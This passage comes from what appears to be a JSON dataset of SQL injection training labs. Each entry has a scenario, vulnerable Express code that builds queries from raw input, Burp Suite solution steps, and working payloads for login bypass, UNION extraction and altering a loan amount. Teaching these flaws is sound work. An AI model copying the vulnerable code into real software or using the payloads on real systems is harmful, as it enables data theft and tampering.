    "Lab Description": "The loan application form accepts user input, including the loan amount, and inserts it directly into an SQL query without proper sanitization. To solve: inject SQL payloads to access and manipulate the loan data in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify loan application request",
      "Inject payloads such as ' OR 1=1 -- to bypass loan approval logic",
      "Perform UNION-based injection to retrieve loan application details",
      "Extract sensitive loan data from the database",
      "Manipulate loan amounts and approve applications"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/loanApplication', (req, res) => {\n  const amount = req.body.amount;\n  const userId = req.body.userId;\n  const query = `INSERT INTO loans (amount, user_id) VALUES ('${amount}', '${userId}')`; \n  db.query(query, (err) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Loan application submitted');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "'; UPDATE loans SET amount='1000000' WHERE id='1' --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in post creation",
    "Lab Description": "The CMS allows content creators to create posts, and the input is directly inserted into SQL queries. A lack of input sanitization makes the system vulnerable to SQL injection. To solve: inject payloads that manipulate posts in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify POST request for new post",
      "Inject payloads like ' OR '1'='1' -- to bypass validation",
      "Perform UNION-based injection to retrieve post data",
      "Examine the posts table for sensitive content",
      "Extract post data and user metadata"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/createPost', (req, res) => {\n  const title = req.body.title;\n  const content = req.body.content;\n  const query = `INSERT INTO posts (title, content) VALUES ('${title}', '${content}')`; \n  db.query(query, (err) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Post created');\n  });\n});",
    "payloads": [
      "';--",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in authentication endpoint",
    "Lab Description": "The authentication endpoint for user login is vulnerable to SQL injection due to improper sanitization of user input. To solve: bypass authentication and retrieve user session details from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept login requests",
      "Inject SQL payloads like ' OR '1'='1' -- in the username or password field",
      "Bypass authentication by observing server response changes",
      "Extract user session tokens using UNION SELECT",
      "Use the extracted session tokens to escalate privileges"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR 1=1 LIMIT 1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in account balance lookup",
    "Lab Description": "The banking portal allows users to view account balances based on account number. However, the account number is directly inserted into SQL queries without sanitization. To solve: inject payloads that retrieve sensitive account information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify GET request with `account` parameter",
      "Inject SQL payloads like ' OR '1'='1' -- to bypass restrictions",
      "Use UNION SELECT to extract balance data",
      "Extract sensitive account information from the database",
      "Verify successful data retrieval from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/accountBalance', (req, res) => {\n  const account = req.query.account;\n  const query = `SELECT balance FROM accounts WHERE account_number = '${account}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in category listing",
    "Lab Description": "The CMS allows users to filter posts by category. The category input is directly inserted into the SQL query without proper sanitization. To solve: inject payloads that list all categories and extract post data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify GET request with `category` parameter",
      "Inject SQL payloads such as ' OR '1'='1' -- to bypass filtering",
      "Perform UNION SELECT to dump category and post data",
      "Extract post titles and user data from the database",
      "Bypass category filtering to retrieve all posts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/category', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM posts WHERE category = '${category}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  }
]
